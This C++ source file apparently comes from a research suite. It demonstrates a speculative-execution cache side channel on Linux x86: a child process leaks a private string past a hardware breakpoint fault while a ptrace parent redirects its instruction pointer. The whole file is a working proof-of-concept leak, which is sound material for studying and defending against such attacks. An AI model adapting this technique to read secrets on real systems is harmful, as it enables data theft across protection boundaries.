/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates speculative execution over hardware breakpoint fault.
 * That is a breakpoint that guards an instruction address and is triggered when
 * that instruction is executed (not read nor written).
 * We fork the process and run the demonstration in the child, while the parent
 * takes care for setting up the breakpoint and moving the instruction pointer
 * over the dead code after the fault.
 **/

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !defined(__i386__) && !defined(__x86_64__)
#  error Unsupported CPU. X86/64 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Points to the "nop" instruction that will be guarded by the execution
// breakpoint.
extern char breakpoint[];

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // We have to precompute the addresses in the oracle, because here the
    // speculation window on Intel (not on AMD) is too small to allow
    // computation of the unsafe address in the oracle speculatively.
    const void *safe_address =
        oracle.data() + static_cast<size_t>(data[safe_offset]);

    // Architecturally dead variable - never read again. It is also the only
    // fetch of the "data[offset]". Therefore its value is architecturally
    // isolated from the rest of the program.
    const void *unsafe_address =
        oracle.data() + static_cast<size_t>(data[offset]);

    // Successful access of the safe address in the Oracle.
    ForceRead(safe_address);

    // NOP instruction after the breakpoint label. That one is guarded by the
    // execution breakpoint. Contrary to the read/write hardware watcher, this
    // is a fault (not a trap) and the tracer moves the instruction pointer to
    // afterspeculation instead.
    asm volatile(
        "breakpoint:\n"
        "nop\n");

    // Dead code. Executed only speculatively.
    ForceRead(unsafe_address);

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // Tracer moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

void ChildProcess() {
  // Allow the parent to trace child's execution.
  int res = ptrace(PTRACE_TRACEME, 0, nullptr, nullptr);
  if (res == -1) {
    std::cerr << "PTRACE_TRACEME failed." << std::endl;
    exit(EXIT_FAILURE);
  }

  // Synchronize with the parent. Let it setup the hardware breakpoint on the
  // critical nop instruction.
  raise(SIGSTOP);

  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    MemoryAndSpeculationBarrier();
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}

void ParentProcess(pid_t child) {
  // Index of the breakpoint in the private data.
  size_t index = 0;
  while (true) {
    int wstatus, res;
    wait(&wstatus);
    if (!WIFSTOPPED(wstatus)) {
      break;  // Unexpected wait event.
    }

    if (WSTOPSIG(wstatus) == SIGSTOP) {
      // Set debug registers.
      // The child stopped itself with "raise(SIGSTOP)". We have to put the
      // breakpoint on the "nop" instruction marked by the "breakpoint" label
      // and let the child continue.
      res = ptrace(PTRACE_POKEUSER, child, offsetof(user, u_debugreg[0]),
                   breakpoint);
      if (res == -1) {
        std::cerr << "PTRACE_POKEUSER on dr0 failed." << std::endl;
        exit(EXIT_FAILURE);
      }

      // Setting the 0th bit in dr7.
      // 0th bit means the active breakpoint is in local dr0.
      // We leave the length bits set to 00 so that we get one-byte
      // granularity. We also leave the mode bits set to 00, because it's an
      // execution breakpoint.
      res = ptrace(PTRACE_POKEUSER, child, offsetof(user, u_debugreg[7]), 0x1);
      if (res == -1) {
        std::cerr << "PTRACE_POKEUSER on dr7 failed." << errno << std::endl;
        exit(EXIT_FAILURE);
      }
    } else if (WSTOPSIG(wstatus) == SIGTRAP) {
      // Move instruction pointer.
      // The child was trapped by executing the hardware breakpoint. We just
      // move its instruction pointer to the afterspeculation label.
      user_regs_struct regs;
      // Read general purpose register values of the child.
      res = ptrace(PTRACE_GETREGS, child, nullptr, &regs);
      if (res == -1) {
        std::cerr << "PTRACE_GETREGS failed." << std::endl;
        exit(EXIT_FAILURE);
      }

      // Move the child's instruction pointer to afterspeculation.
#ifdef __x86_64__
      regs.rip = reinterpret_cast<size_t>(afterspeculation);
#else
      regs.eip = reinterpret_cast<size_t>(afterspeculation);
#endif

      // Store the shifted child's instruction pointer value.
      res = ptrace(PTRACE_SETREGS, child, nullptr, &regs);
      if (res == -1) {
        std::cerr << "PTRACE_SETREGS failed." << std::endl;
        exit(EXIT_FAILURE);
      }
    } else {
      // Unexpected signal received by the child.
      // The child didn't stop with SIGSTOP nor SIGTRAP.
      // Terminating the parent.
      break;
    }

    // Wake up the child.
    res = ptrace(PTRACE_CONT, child, nullptr, nullptr);
    if (res == -1) {
      std::cerr << "PTRACE_CONT after signal failed." << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  pid_t pid = fork();
  if (pid == 0) {
    // Tracee.
    ChildProcess();
  } else {
    // Tracer.
    ParentProcess(pid);
  }
}
